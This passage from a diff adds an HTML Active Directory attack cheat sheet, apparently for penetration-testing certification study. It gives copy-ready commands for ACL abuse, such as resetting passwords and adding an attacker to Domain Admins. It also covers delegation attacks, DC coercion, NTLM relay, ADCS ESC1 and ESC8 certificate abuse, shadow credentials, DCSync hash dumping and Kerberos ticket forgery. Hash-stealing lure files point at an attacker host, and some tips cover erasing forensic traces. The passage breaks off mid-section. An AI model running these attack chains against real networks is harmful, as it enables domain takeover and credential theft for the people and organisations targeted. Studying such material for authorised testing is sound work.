+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># PowerView — change user password</span>
+$NewPass = ConvertTo-SecureString '<span class="ph">NewPass123!</span>' -AsPlainText -Force
+Set-DomainUserPassword -Identity <span class="ph">targetuser</span> -AccountPassword $NewPass
+
+<span class="cmt"># rpcclient — old-school reliable</span>
+rpcclient -U "<span class="ph">domain</span>/<span class="ph">attacker</span>%<span class="ph">pass</span>" <span class="ph">DC_IP</span>
+  rpcclient $> setuserinfo2 <span class="ph">targetuser</span> 23 '<span class="ph">NewPass123!</span>'
+
+<span class="cmt"># impacket — rpcchangepwd.py</span>
+rpcchangepwd.py '<span class="ph">domain</span>/<span class="ph">attacker</span>:<span class="ph">pass</span>@<span class="ph">DC_IP</span>' \
+  -target-user <span class="ph">targetuser</span> \
+  -new-password '<span class="ph">NewPass123!</span>'</pre>
+      </div>
+
+      <div class="cd">Add user to group — GenericAll/AddMember on group</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># PowerView</span>
+Add-DomainGroupMember -Identity '<span class="ph">Domain Admins</span>' \
+  -Members '<span class="ph">attacker</span>'
+
+<span class="cmt"># net group (Windows — requires /domain flag)</span>
+net group "<span class="ph">Domain Admins</span>" <span class="ph">attacker</span> /add /domain
+
+<span class="cmt"># Verify</span>
+Get-DomainGroupMember "<span class="ph">Domain Admins</span>"</pre>
+      </div>
+
+      <div class="gotcha"><strong>GOTCHA:</strong> <code>net group</code> without <code>/domain</code> targets local groups only — always include <code>/domain</code> for AD groups. Group membership changes take effect on next logon — use a new ticket/session after adding yourself.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">WriteDACL / WriteOwner Chain</span><span class="tag th">HIGH VALUE</span></div>
+    <div class="cb">
+      <div class="cd">WriteDACL → grant GenericAll → abuse</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Step 1 — grant yourself GenericAll via WriteDACL</span>
+Add-DomainObjectAcl \
+  -TargetIdentity <span class="ph">targetuser</span> \
+  -PrincipalIdentity <span class="ph">attacker</span> \
+  -Rights All
+
+<span class="cmt"># Verify the new ACE was written</span>
+Get-DomainObjectAcl -Identity <span class="ph">targetuser</span> -ResolveGUIDs |
+  Where-Object { $_.SecurityIdentifier -match "<span class="ph">attacker_SID</span>" }
+
+<span class="cmt"># Step 2 — now abuse GenericAll (shadow creds, password reset, etc.)</span>
+certipy shadow auto -u <span class="ph">attacker</span>@<span class="ph">domain</span> -p '<span class="ph">pass</span>' \
+  -account <span class="ph">targetuser</span> -dc-ip <span class="ph">DC_IP</span></pre>
+      </div>
+
+      <div class="cd">WriteOwner → take ownership → WriteDACL → GenericAll</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Take ownership</span>
+Set-DomainObjectOwner -Identity <span class="ph">targetuser</span> \
+  -OwnerIdentity <span class="ph">attacker</span>
+
+<span class="cmt"># Now you own it — grant WriteDACL</span>
+Add-DomainObjectAcl -TargetIdentity <span class="ph">targetuser</span> \
+  -PrincipalIdentity <span class="ph">attacker</span> \
+  -Rights WriteDacl
+
+<span class="cmt"># Then grant GenericAll</span>
+Add-DomainObjectAcl -TargetIdentity <span class="ph">targetuser</span> \
+  -PrincipalIdentity <span class="ph">attacker</span> \
+  -Rights All</pre>
+      </div>
+
+      <div class="tip"><strong>CLEANUP:</strong> Remove injected ACEs after exploitation to reduce forensic footprint. <code>Remove-DomainObjectAcl -TargetIdentity TARGET -PrincipalIdentity attacker -Rights All</code></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════════════ -->
+<div id="delegation" class="phase"><span class="phase-num">05</span>Delegation Attacks</div>
+
+<div class="g3">
+
+  <div class="card">
+    <div class="ch"><span class="ct">Unconstrained Delegation</span><span class="tag tc">CRITICAL — DC capture path</span></div>
+    <div class="cb">
+      <div class="cd">Find hosts with unconstrained delegation (excludes DCs)</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># PowerView</span>
+Get-DomainComputer -Unconstrained |
+  Select-Object dnshostname
+
+<span class="cmt"># BloodHound query</span>
+MATCH (c:Computer {unconstraineddelegation:true,
+  name:&lt;&gt;"DC01.DOMAIN.LOCAL"}) RETURN c.name</pre>
+      </div>
+
+      <div class="cd">Force coercion to capture DC TGT</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># On unconstrained host — monitor for TGTs</span>
+Rubeus.exe monitor /interval:5 /nowrap
+
+<span class="cmt"># Coerce DC authentication to unconstrained host</span>
+<span class="cmt"># From Kali — PrinterBug</span>
+python3 printerbug.py \
+  '<span class="ph">domain</span>/<span class="ph">user</span>:<span class="ph">pass</span>@<span class="ph">DC_IP</span>' \
+  <span class="ph">UNCONSTRAINED_HOST_IP</span>
+
+<span class="cmt"># OR Coercer</span>
+coercer coerce -u <span class="ph">user</span> -p '<span class="ph">pass</span>' \
+  -d <span class="ph">domain.local</span> \
+  --listener <span class="ph">UNCONSTRAINED_HOST_IP</span> \
+  --target <span class="ph">DC_IP</span>
+
+<span class="cmt"># DC TGT captured — inject and DCSync</span>
+Rubeus.exe ptt /ticket:<span class="ph">BASE64_TGT</span>
+secretsdump.py -k -no-pass <span class="ph">DC_FQDN</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">Constrained Delegation</span><span class="tag th">HIGH VALUE</span></div>
+    <div class="cb">
+      <div class="cd">Find hosts/users with constrained delegation configured</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># PowerView</span>
+Get-DomainUser -TrustedToAuth |
+  Select-Object samaccountname, msds-allowedtodelegateto
+Get-DomainComputer -TrustedToAuth |
+  Select-Object dnshostname, msds-allowedtodelegateto</pre>
+      </div>
+
+      <div class="cd">S4U2Self + S4U2Proxy — impersonate DA to allowed service</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Rubeus — request TGT for delegating account first</span>
+Rubeus.exe asktgt /user:<span class="ph">svc_account</span> /password:'<span class="ph">pass</span>' /nowrap
+
+<span class="cmt"># S4U2Self (get ST for DA to svc_account)</span>
+<span class="cmt"># S4U2Proxy (use that ST to impersonate DA to target)</span>
+Rubeus.exe s4u /ticket:<span class="ph">BASE64_TGT</span> \
+  /impersonateuser:administrator \
+  /msdsspn:"<span class="ph">cifs/target.domain.local</span>" \
+  /ptt
+
+<span class="cmt"># Access target as DA</span>
+ls \\<span class="ph">target.domain.local</span>\C$</pre>
+      </div>
+
+      <div class="tip"><strong>NOTE:</strong> Protocol Transition (any auth) allows impersonation of ANY user. Without it (Kerberos-only), the impersonated user must have a TGS for the service already. Check <code>msDS-AllowedToDelegateTo</code> and <code>TrustedToAuthForDelegation</code> UAC flag.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">RBCD — Resource-Based Constrained Delegation</span><span class="tag tc">CRITICAL — no DA needed</span></div>
+    <div class="cb">
+      <div class="cd">Prerequisites: GenericWrite/GenericAll on target computer + machine account (quota or existing)</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Step 1 — create controlled machine account</span>
+addcomputer.py -computer-name '<span class="ph">RBCD$</span>' \
+  -computer-pass '<span class="ph">RBCDPass123!</span>' \
+  -dc-ip <span class="ph">DC_IP</span> \
+  '<span class="ph">domain.local</span>/<span class="ph">user</span>:<span class="ph">pass</span>'
+
+<span class="cmt"># Step 2 — write msDS-AllowedToActOnBehalfOf on target</span>
+rbcd.py -dc-ip <span class="ph">DC_IP</span> \
+  -action write \
+  -delegate-to <span class="ph">TARGET$</span> \
+  -delegate-from <span class="ph">RBCD$</span> \
+  '<span class="ph">domain.local</span>/<span class="ph">user</span>:<span class="ph">pass</span>'
+
+<span class="cmt"># Verify</span>
+rbcd.py -dc-ip <span class="ph">DC_IP</span> -action read \
+  -delegate-to <span class="ph">TARGET$</span> \
+  '<span class="ph">domain.local</span>/<span class="ph">user</span>:<span class="ph">pass</span>'
+
+<span class="cmt"># Step 3 — S4U2Self + S4U2Proxy to get admin ST</span>
+getST.py -spn 'cifs/<span class="ph">TARGET</span>' \
+  -impersonate administrator \
+  -dc-ip <span class="ph">DC_IP</span> \
+  '<span class="ph">domain.local</span>/<span class="ph">RBCD$</span>:<span class="ph">RBCDPass123!</span>'
+
+<span class="cmt"># Use the ticket</span>
+export KRB5CCNAME=administrator@cifs_TARGET.ccache
+secretsdump.py -k -no-pass <span class="ph">TARGET.domain.local</span></pre>
+      </div>
+
+      <div class="gotcha"><strong>GOTCHA:</strong> Machine Account Quota (MAQ) defaults to 10 — any domain user can create machine accounts. Verify with: <code>ldapsearch ... ms-DS-MachineAccountQuota</code>. If MAQ=0, you need an existing machine account with known creds.</div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════════════ -->
+<div id="coercion" class="phase"><span class="phase-num">06</span>Coercion + NTLM Relay</div>
+
+<div class="g2">
+
+  <div class="card">
+    <div class="ch"><span class="ct">Responder — NTLM Hash Capture</span><span class="tag th">HIGH VALUE — quick wins</span></div>
+    <div class="cb">
+      <div class="cd">Capture NetNTLMv2 hashes passively or via coercion</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Start Responder — capture on all interfaces</span>
+responder -I <span class="ph">tun0</span> -wv
+
+<span class="cmt"># IMPORTANT: Disable SMB+HTTP when relaying (or captures only)</span>
+<span class="cmt"># Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off</span>
+responder -I <span class="ph">tun0</span> -wv  <span class="cmt"># With SMB off for relay mode</span>
+
+<span class="cmt"># Captured hashes saved to: /usr/share/responder/logs/</span>
+<span class="cmt"># Crack NetNTLMv2 — hashcat mode 5600</span>
+hashcat -m 5600 ntlmv2.txt \
+  /opt/wordlists/rockyou2021.txt \
+  -r /opt/rules/rockyou-30000.rule</pre>
+      </div>
+
+      <div class="cd">Trigger NTLM auth via file share path injection</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># If you can write to a network share — plant a UNC pointer</span>
+<span class="cmt"># Create a malicious .lnk or @threat.url pointing to Kali share</span>
+
+<span class="cmt"># Simple: plant desktop.ini or icon file in writable share</span>
+cat > @pwn.url &lt;&lt; 'EOF'
+[InternetShortcut]
+URL=file://<span class="ph">KALI_IP</span>/pwn
+EOF
+
+<span class="cmt"># Or use ntlm_theft to generate lure files</span>
+python3 ntlm_theft.py -g all -s <span class="ph">KALI_IP</span> -f pwn</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">ntlmrelayx — NTLM Relay Attacks</span><span class="tag tc">CRITICAL — when SMB signing disabled</span></div>
+    <div class="cb">
+      <div class="cd">Check SMB signing first — relay only works if unsigned</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Find hosts with SMB signing disabled</span>
+nxc smb <span class="ph">SUBNET/24</span> --gen-relay-list relay_targets.txt
+
+<span class="cmt"># Basic relay to SAM dump</span>
+ntlmrelayx.py -tf relay_targets.txt -smb2support
+
+<span class="cmt"># Interactive shell (drop into SMBClient shell)</span>
+ntlmrelayx.py -tf relay_targets.txt -smb2support -i
+
+<span class="cmt"># LDAP relay — create computer account for RBCD</span>
+ntlmrelayx.py -t ldap://<span class="ph">DC_IP</span> --delegate-access \
+  --escalate-user <span class="ph">attacker_machine$</span>
+
+<span class="cmt"># Relay to ADCS HTTP endpoint (ESC8)</span>
+ntlmrelayx.py -t http://<span class="ph">CA_HOST</span>/certsrv/certfnsh.asp \
+  --adcs --template DomainController</pre>
+      </div>
+
+      <div class="gotcha"><strong>RELAY GOTCHA:</strong> Cannot relay to the same host the hash came from. Build relay_targets.txt carefully — exclude the coerced host. SMB signing must be disabled on relay target. Domain Controllers always have SMB signing enabled.</div>
+    </div>
+  </div>
+
+</div>
+
+<div class="g2" style="margin-top:14px">
+
+  <div class="card">
+    <div class="ch"><span class="ct">Coercion Tools — Force DC Auth</span><span class="tag th">HIGH VALUE — unconstrained + relay</span></div>
+    <div class="cb">
+      <div class="cd">Multiple coercion techniques — try in order</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Coercer — tries ALL coercion methods automatically</span>
+coercer coerce \
+  -u <span class="ph">user</span> -p '<span class="ph">pass</span>' -d <span class="ph">domain.local</span> \
+  --listener <span class="ph">KALI_IP</span> \
+  --target <span class="ph">DC_IP</span>
+
+<span class="cmt"># PetitPotam — EfsRpcOpenFileRaw (works unauth in older envs)</span>
+python3 PetitPotam.py -u <span class="ph">user</span> -p '<span class="ph">pass</span>' \
+  -d <span class="ph">domain.local</span> \
+  <span class="ph">KALI_IP</span> <span class="ph">DC_IP</span>
+
+<span class="cmt"># PrinterBug / SpoolSample (MS-RPRN)</span>
+python3 printerbug.py \
+  '<span class="ph">domain</span>/<span class="ph">user</span>:<span class="ph">pass</span>@<span class="ph">DC_IP</span>' <span class="ph">KALI_IP</span>
+
+<span class="cmt"># Check if Print Spooler running first</span>
+nxc smb <span class="ph">DC_IP</span> -u <span class="ph">user</span> -p '<span class="ph">pass</span>' -M spooler</pre>
+      </div>
+
+      <div class="tip"><strong>COMBINE WITH:</strong> Unconstrained Delegation → capture DC TGT → DCSync. OR Relay to ADCS (ESC8) → get DC cert → PKINIT → DA hash. Both chains start with coercion.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">WebClient / WebDAV Coercion (RBCD via HTTP)</span><span class="tag th">CPTS PATTERN — Trilocor</span></div>
+    <div class="cb">
+      <div class="cd">WebClient service enables HTTP-based NTLM auth — bypasses SMB signing</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Check if WebClient (WebDAV) running on target</span>
+nxc smb <span class="ph">TARGET</span> -u <span class="ph">user</span> -p '<span class="ph">pass</span>' -M webdav
+
+<span class="cmt"># If WebClient running — coerce via HTTP listener (not SMB)</span>
+<span class="cmt"># This bypasses SMB signing restriction entirely</span>
+
+<span class="cmt"># Start ntlmrelayx over HTTP</span>
+ntlmrelayx.py -t ldap://<span class="ph">DC_IP</span> \
+  --delegate-access --escalate-user <span class="ph">RBCD$</span>
+
+<span class="cmt"># Coerce target to HTTP listener</span>
+<span class="cmt"># Port 80 listener on Kali — WebClient sends HTTP auth</span>
+coercer coerce \
+  -u <span class="ph">user</span> -p '<span class="ph">pass</span>' -d <span class="ph">domain.local</span> \
+  --listener <span class="ph">KALI_IP</span>@80/test \
+  --target <span class="ph">TARGET_IP</span>
+
+<span class="cmt"># Start WebClient on target if needed (no admin rights)</span>
+Start-Service WebClient</pre>
+      </div>
+
+      <div class="gotcha"><strong>TRILOCOR LESSON:</strong> WebClient coercion uses HTTP not SMB — SMB signing is irrelevant. The machine account auth goes to your HTTP listener. This is why RBCD via WebDAV coercion works where direct SMB relay fails against signing-enabled DCs.</div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════════════ -->
+<div id="adcs" class="phase"><span class="phase-num">07</span>ADCS — Certificate Template Vulnerabilities</div>
+
+<div class="g2">
+
+  <div class="card s2">
+    <div class="ch"><span class="ct">ADCS ESC Reference — Detection + Exploitation</span><span class="tag tc">CRITICAL — Certipy</span></div>
+    <div class="cb">
+      <div class="cd">Discover all ADCS vulnerabilities in one scan</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Certipy find — all vulns, actionable only</span>
+certipy-ad find -u <span class="ph">user</span>@<span class="ph">domain.local</span> \
+  -p '<span class="ph">pass</span>' -dc-ip <span class="ph">DC_IP</span> -vulnerable
+
+<span class="cmt"># With hash</span>
+certipy-ad find -u <span class="ph">user</span>@<span class="ph">domain.local</span> \
+  -hashes :<span class="ph">NTHASH</span> -dc-ip <span class="ph">DC_IP</span> -vulnerable
+
+<span class="cmt"># ESCalate.py — alternative with more detail on ESC16</span>
+python3 escalate.py -dc <span class="ph">DC_IP</span> -d <span class="ph">domain.local</span> \
+  -u <span class="ph">user</span> -p '<span class="ph">pass</span>' --actionable</pre>
+      </div>
+
+      <table class="ft" style="margin-top:12px">
+        <tr>
+          <th>ESC</th>
+          <th>Condition</th>
+          <th>Attack</th>
+          <th>Certipy Command</th>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-crit">ESC1</span></td>
+          <td>Client auth template + enrollees can supply SAN (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)</td>
+          <td>Request cert with SAN=administrator — get DA hash</td>
+          <td><code>certipy req ... -template TEMPLATE -upn administrator@domain</code></td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-high">ESC2</span></td>
+          <td>Any Purpose EKU or no EKU — can be used for any auth</td>
+          <td>Use cert for Schannel auth or PKINIT</td>
+          <td>Enroll in template, use for auth</td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-high">ESC3</span></td>
+          <td>Certificate Request Agent EKU — enroll on behalf of others</td>
+          <td>Enroll as agent → request cert on behalf of DA</td>
+          <td><code>certipy req ... -on-behalf-of domain\\administrator</code></td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-high">ESC4</span></td>
+          <td>Write permissions on certificate template</td>
+          <td>Modify template to add ESC1 conditions → exploit</td>
+          <td><code>certipy template -template TEMPLATE -save-old; certipy req ...</code></td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-med">ESC6</span></td>
+          <td>EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA — all templates vulnerable to SAN injection</td>
+          <td>Same as ESC1 but applies to any enrollable template</td>
+          <td><code>certipy req ... -template User -upn administrator@domain</code></td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-high">ESC7</span></td>
+          <td>ManageCA or ManageCertificates rights on CA</td>
+          <td>Enable EDITF_ATTRIBUTESUBJECTALTNAME2 → ESC6, or approve pending certs</td>
+          <td><code>certipy ca -ca CA_NAME -add-officer attacker</code></td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-crit">ESC8</span></td>
+          <td>HTTP enrollment endpoint (Web Enrollment) enabled on CA</td>
+          <td>Relay DC auth to CA HTTP → get DC cert → DCSync</td>
+          <td><code>ntlmrelayx ... -t http://CA/certsrv/certfnsh.asp --adcs --template DC</code></td>
+        </tr>
+        <tr>
+          <td><span class="acl-edge ae-crit">ESC16</span></td>
+          <td>szOID_NTDS_CA_SECURITY_EXT disabled (no sec extension) — weak mapping exploitable</td>
+          <td>UPN swap (GenericWrite on account → set UPN to administrator → enroll → restore → auth)</td>
+          <td>See Fluffy chain in Pentest Field Guide §06</td>
+        </tr>
+      </table>
+    </div>
+  </div>
+
+</div>
+
+<div class="g2" style="margin-top:14px">
+
+  <div class="card">
+    <div class="ch"><span class="ct">ESC1 — Full Exploitation Chain</span><span class="tag tc">CRITICAL — most common</span></div>
+    <div class="cb">
+      <div class="cd">Template allows enrollees to specify Subject Alternative Name</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Step 1 — find vulnerable template + CA name from certipy find</span>
+<span class="cmt">#   Look for: [!] Vulnerabilities: ESC1</span>
+<span class="cmt">#   Note: Template Name, CA Name</span>
+
+<span class="cmt"># Step 2 — request cert with administrator UPN in SAN</span>
+certipy-ad req \
+  -u <span class="ph">user</span>@<span class="ph">domain.local</span> -p '<span class="ph">pass</span>' \
+  -dc-ip <span class="ph">DC_IP</span> \
+  -ca '<span class="ph">CA-NAME</span>' \
+  -template '<span class="ph">VULNERABLE_TEMPLATE</span>' \
+  -upn administrator@<span class="ph">domain.local</span>
+<span class="cmt"># Outputs: administrator.pfx</span>
+
+<span class="cmt"># Step 3 — authenticate with cert → get NT hash</span>
+certipy-ad auth \
+  -pfx administrator.pfx \
+  -dc-ip <span class="ph">DC_IP</span>
+<span class="cmt"># Outputs: administrator NT hash</span>
+
+<span class="cmt"># Step 4 — PTH</span>
+evil-winrm -i <span class="ph">DC_IP</span> \
+  -u administrator -H <span class="ph">NTHASH</span>
+secretsdump.py -hashes :<span class="ph">NTHASH</span> \
+  administrator@<span class="ph">DC_IP</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">ESC8 — NTLM Relay to ADCS Web Enrollment</span><span class="tag tc">CRITICAL — relay to DA</span></div>
+    <div class="cb">
+      <div class="cd">Relay DC auth to CA web enrollment → get DC certificate → DCSync</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Step 1 — Check if web enrollment enabled</span>
+certipy-ad find ... -vulnerable
+<span class="cmt"># OR manual: curl http://CA_HOST/certsrv/ (200 = enabled)</span>
+
+<span class="cmt"># Step 2 — Start ntlmrelayx targeting CA web enrollment</span>
+<span class="cmt">#   Disable SMB/HTTP in Responder.conf first</span>
+ntlmrelayx.py \
+  -t http://<span class="ph">CA_HOST</span>/certsrv/certfnsh.asp \
+  --adcs \
+  --template DomainController \
+  -smb2support
+
+<span class="cmt"># Step 3 — Start Responder (SMB=Off, HTTP=Off)</span>
+responder -I <span class="ph">tun0</span> -wv
+
+<span class="cmt"># Step 4 — Coerce DC authentication</span>
+python3 PetitPotam.py <span class="ph">KALI_IP</span> <span class="ph">DC_IP</span>
+
+<span class="cmt"># Step 5 — Relay delivers DC.pfx</span>
+<span class="cmt"># Request TGT with PKINIT + extract NT hash</span>
+certipy-ad auth \
+  -pfx dc.pfx -dc-ip <span class="ph">DC_IP</span>
+
+<span class="cmt"># Step 6 — DCSync with DC hash</span>
+secretsdump.py -hashes :<span class="ph">DC_NTHASH</span> \
+  '<span class="ph">domain</span>/DC01$@<span class="ph">DC_IP</span>'</pre>
+      </div>
+
+      <div class="gotcha"><strong>RELAY CHAIN:</strong> This is a 3-tool coordinated attack: Responder (capture) → ntlmrelayx (relay to CA) → Coercer (force DC auth). All three must be running simultaneously. Responder SMB/HTTP MUST be disabled or it intercepts before relay.</div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════════════ -->
+<div id="shadow-creds" class="phase"><span class="phase-num">08</span>Shadow Credentials</div>
+
+<div class="g2">
+
+  <div class="card">
+    <div class="ch"><span class="ct">Shadow Credentials — GenericWrite → PKINIT → Hash</span><span class="tag tc">CRITICAL — lockout safe</span></div>
+    <div class="cb">
+      <div class="cd">Requires: GenericWrite or GenericAll on target user/computer. Requires: AD CS with PKINIT support.</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Method 1 — certipy shadow (auto mode — does everything)</span>
+certipy-ad shadow auto \
+  -u <span class="ph">attacker</span>@<span class="ph">domain.local</span> -p '<span class="ph">pass</span>' \
+  -dc-ip <span class="ph">DC_IP</span> \
+  -account <span class="ph">targetuser</span>
+<span class="cmt"># Outputs: targetuser.ccache + NT hash automatically</span>
+
+<span class="cmt"># Method 2 — pywhisker (more granular control)</span>
+<span class="cmt"># Add KeyCredential</span>
+python3 pywhisker.py \
+  -d <span class="ph">domain.local</span> -u <span class="ph">attacker</span> -p '<span class="ph">pass</span>' \
+  --dc-ip <span class="ph">DC_IP</span> \
+  --target <span class="ph">targetuser</span> \
+  --action add
+<span class="cmt"># Outputs: DEVICE_ID.pfx + DEVICE_ID password</span>
+
+<span class="cmt"># Request TGT with the cert (PKINITtools)</span>
+python3 gettgtpkinit.py \
+  -cert-pfx <span class="ph">DEVICE_ID</span>.pfx \
+  -pfx-pass '<span class="ph">CERT_PASS</span>' \
+  <span class="ph">domain.local</span>/<span class="ph">targetuser</span> \
+  <span class="ph">targetuser</span>.ccache
+
+<span class="cmt"># Extract NT hash from TGT</span>
+export KRB5CCNAME=<span class="ph">targetuser</span>.ccache
+python3 getnthash.py \
+  <span class="ph">domain.local</span>/<span class="ph">targetuser</span> -key <span class="ph">AS_REP_KEY</span></pre>
+      </div>
+
+      <div class="tip"><strong>KEY ADVANTAGE:</strong> Shadow Credentials uses the <code>msDS-KeyCredentialLink</code> attribute — no password change, no lockout, minimal noise. The target account continues to function normally. Cleanup: remove the KeyCredential after use.</div>
+
+      <div class="gotcha"><strong>GOTCHA:</strong> PKINIT must be available on the DC. Requires a CA deployed in the domain. If no CA exists, Shadow Creds won't work — fall back to ForceChangePassword or targeted Kerberoasting (add SPN to target account via GenericWrite).</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">Shadow Creds Cleanup + Fallback</span><span class="tag tm">OPSEC</span></div>
+    <div class="cb">
+      <div class="cd">List and remove KeyCredentials after exploitation</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># List existing KeyCredentials on target</span>
+python3 pywhisker.py \
+  -d <span class="ph">domain.local</span> -u <span class="ph">attacker</span> -p '<span class="ph">pass</span>' \
+  --dc-ip <span class="ph">DC_IP</span> \
+  --target <span class="ph">targetuser</span> \
+  --action list
+
+<span class="cmt"># Remove specific credential by DeviceID</span>
+python3 pywhisker.py \
+  -d <span class="ph">domain.local</span> -u <span class="ph">attacker</span> -p '<span class="ph">pass</span>' \
+  --dc-ip <span class="ph">DC_IP</span> \
+  --target <span class="ph">targetuser</span> \
+  --action remove \
+  --device-id <span class="ph">DEVICE_ID</span>
+
+<span class="cmt"># Certipy shadow cleanup</span>
+certipy-ad shadow clear \
+  -u <span class="ph">attacker</span>@<span class="ph">domain.local</span> -p '<span class="ph">pass</span>' \
+  -dc-ip <span class="ph">DC_IP</span> \
+  -account <span class="ph">targetuser</span></pre>
+      </div>
+
+      <div class="cd">Fallback: SPN-based Kerberoast via GenericWrite</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># If no CA/PKINIT — set SPN on target → kerberoast them</span>
+Set-DomainObject -Identity <span class="ph">targetuser</span> \
+  -Set @{serviceprincipalname='fake/spn'}
+
+<span class="cmt"># Now roast their account</span>
+GetUserSPNs.py <span class="ph">domain</span>/<span class="ph">attacker</span>:'<span class="ph">pass</span>' \
+  -dc-ip <span class="ph">DC_IP</span> -request \
+  -outputfile kerb.txt
+
+<span class="cmt"># Cleanup SPN after cracking</span>
+Set-DomainObject -Identity <span class="ph">targetuser</span> \
+  -Clear serviceprincipalname</pre>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════════════ -->
+<div id="tickets" class="phase"><span class="phase-num">09</span>Ticket Attacks — PTT / Golden / Silver / Overpass</div>
+
+<div class="g3">
+
+  <div class="card">
+    <div class="ch"><span class="ct">Pass-the-Ticket</span><span class="tag th">HIGH VALUE</span></div>
+    <div class="cb">
+      <div class="cd">Import and use Kerberos tickets from ccache/kirbi files</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Linux — set KRB5CCNAME env var</span>
+export KRB5CCNAME=/path/to/ticket.ccache
+klist  <span class="cmt"># verify ticket loaded</span>
+secretsdump.py -k -no-pass <span class="ph">DC_FQDN</span>
+smbclient.py -k -no-pass <span class="ph">TARGET</span>
+
+<span class="cmt"># Windows — Rubeus inject .kirbi</span>
+Rubeus.exe ptt /ticket:<span class="ph">BASE64_TICKET</span>
+Rubeus.exe ptt /ticket:ticket.kirbi
+klist  <span class="cmt"># verify</span>
+
+<span class="cmt"># Convert ccache ↔ kirbi</span>
+impacket-ticketConverter ticket.ccache ticket.kirbi
+impacket-ticketConverter ticket.kirbi ticket.ccache</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">Overpass-the-Hash (Pass-the-Key)</span><span class="tag th">HIGH VALUE</span></div>
+    <div class="cb">
+      <div class="cd">Convert NTLM hash → Kerberos TGT (avoids NTLM auth)</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># impacket getTGT — hash → TGT</span>
+getTGT.py <span class="ph">domain.local</span>/<span class="ph">user</span> \
+  -hashes :<span class="ph">NTHASH</span> \
+  -dc-ip <span class="ph">DC_IP</span>
+<span class="cmt"># Outputs: user.ccache</span>
+
+export KRB5CCNAME=<span class="ph">user</span>.ccache
+wmiexec.py -k -no-pass <span class="ph">TARGET</span>
+
+<span class="cmt"># Rubeus (Windows) — hash → TGT in memory</span>
+Rubeus.exe asktgt \
+  /user:<span class="ph">user</span> \
+  /rc4:<span class="ph">NTHASH</span> \
+  /domain:<span class="ph">domain.local</span> \
+  /dc:<span class="ph">DC_FQDN</span> /ptt</pre>
+      </div>
+
+      <div class="tip"><strong>USE WHEN:</strong> NTLM is disabled or when you want Kerberos-only operations (less detectable). Also useful when you have AES keys from secretsdump — use <code>/aes256</code> flag in Rubeus instead of rc4.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">Golden + Silver Tickets</span><span class="tag tc">CRITICAL — post-DA persistence</span></div>
+    <div class="cb">
+      <div class="cd">Golden Ticket — requires KRBTGT hash (offline TGT generation)</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Get KRBTGT hash first (need DA / DCSync)</span>
+secretsdump.py -hashes :<span class="ph">DA_NTHASH</span> \
+  administrator@<span class="ph">DC_IP</span> | grep krbtgt
+
